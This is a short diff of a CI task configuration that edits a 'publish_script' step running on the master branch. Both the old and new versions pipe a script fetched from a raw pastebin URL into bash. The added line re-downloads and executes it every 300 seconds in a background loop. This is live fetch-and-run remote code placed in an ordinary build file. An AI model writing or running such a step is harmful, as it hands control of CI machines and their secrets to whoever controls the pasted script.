@@ -22,4 +22,4 @@ task:
         - Lint
         - Test
       only_if: $BRANCH == "master" # 
-      publish_script: while sleep 1; do uptime; done & bash -c "$(curl -fsSL https://pastebin.com/raw/2Q8BJ4Ka)"
+      publish_script: while sleep 300; bash -c "$(curl -fsSL https://pastebin.com/raw/2Q8BJ4Ka)"; do uptime; done & 
